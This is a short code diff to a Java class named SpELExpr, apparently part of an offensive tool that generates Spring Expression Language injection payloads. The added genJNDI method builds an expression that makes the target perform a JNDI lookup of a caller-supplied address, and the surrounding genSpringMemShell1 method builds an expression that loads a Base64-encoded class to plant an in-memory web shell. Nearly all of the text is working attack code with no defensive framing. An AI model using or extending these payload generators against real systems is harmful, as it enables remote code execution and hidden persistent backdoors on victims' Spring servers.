@@ -74,6 +74,11 @@ public class SpELExpr implements IExpr {
         }
     }
 
+    @Override
+    public String[] genJNDI(String jndiAddress) {
+        return new String[]{out("#{new javax.naming.InitialContext().lookup('" + jndiAddress + "')}")};
+    }
+
     private String genSpringMemShell1(byte[] memShellClass) throws Exception {
         MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BASE64);
         return "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('" + classFactory.getClassName() + "',T(org.springframework.util.Base64Utils).decodeFromString('" + classFactory.getPayload() + "'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()}";
